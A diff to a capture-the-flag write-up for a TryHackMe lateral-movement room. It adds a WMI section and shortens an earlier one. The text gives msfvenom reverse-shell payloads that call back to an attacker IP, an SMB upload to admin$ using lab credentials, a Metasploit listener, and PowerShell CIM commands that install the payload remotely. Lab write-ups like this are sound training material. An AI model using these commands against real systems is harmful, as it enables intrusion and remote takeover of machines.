@@ -916,7 +916,7 @@ Once an attacker has valid credentials on a target machine, they need a way to e
 
 Attackers use __PsExec__, __WinRM__, __remote service creation__, and __scheduled tasks__ to execute commands remotely. __WinRM__ is stealthier than __PsExec__ but still logs activity. `sc.exe` (__remote service creation__) and `schtasks.exe` (__scheduled tasks__) are great for persistence. Defenders should monitor logs, restrict remote execution, and disable unnecessary services.
 
-Now let's follow the steps. We have some credentials captured and are trying to move to a different machine from this Jump Box with these credentials. The room informs that all four methods mentioned above should work against this specified machine, which is why we will try all of them. Let's start with `sc.exe` or remote service creation method:
+Now let's follow the steps. We have some credentials captured and are trying to move to a different machine from this Jump Box with these credentials. Let's start with `sc.exe` or remote service creation method:
 
 ```shell
 msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.56 LPORT=9233 -o sc_myservice.exe
@@ -1010,4 +1010,70 @@ C:\Users\t1_leonard.summers\Desktop>flag.exe
 flag.exe
 THM{****REDACTED****}
 ```
+
+WMI provides a powerful interface for performing system management tasks remotely, allowing attackers to execute processes, create services, run scheduled tasks, and even install software. Let’s dive into some of the techniques attackers can exploit through WMI.
+
+Before interacting with WMI, you need to establish a connection using the appropriate protocol (DCOM or Wsman) and credentials.
+
+First we generate our payload with `metasploit`:
+
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.56 LPORT=9233 -f msi > wmi_installer.msi
+```
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+```
+
+Then we copy it directly to the `admin$` directory of the SMB share using credentials `t1_corine.water:Korine.1994`:
+
+```shell
+smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994 
+```
+```
+putting file wmi_installer.msi as \wmi_installer.msi (87.2 kb/s) (average 87.2 kb/s)
+```
+
+Now let's go back to our Jump Box:
+
+```shell
+ssh za\\t1_corine.waters@10.200.71.249
+```
+
+Start `metasploit` exploit handler:
+
+```shell
+msfconsole -qx "use exploit/multi/handler; set lhost 10.50.65.56; set lport 9233; set payload windows/x64/shell_reverse_tcp; exploit"
+```
+
+Now in our Jump Box, let's change to PowerShell: 
+
+```cmd
+powershell -executionpolicy bypass
+```
+
+And run the following commands:
+
+```powershell
+$username="t1_corine.waters";$password="Korine.1994";$securePassword=ConvertTo-SecureString $password -AsPlainText -Force;$credential=New-Object System.Management.Automation.PSCredential $username,$securePassword;$Opt=New-CimSessionOption -Protocol DCOM;$Session=New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+```powershell
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation="C:\Windows\wmi_installer.msi";Options="";AllUsers=$false}
+```
+
+And then in our newly spawned shell:
+
+```
+C:\Windows\system32>cd C:\Users\t1_corine.waters\Desktop
+cd C:\Users\t1_corine.waters\Desktop
+
+C:\Users\t1_corine.waters\Desktop>Flag.exe
+Flag.exe
+THM{****REDACTED****}
+```
+
 
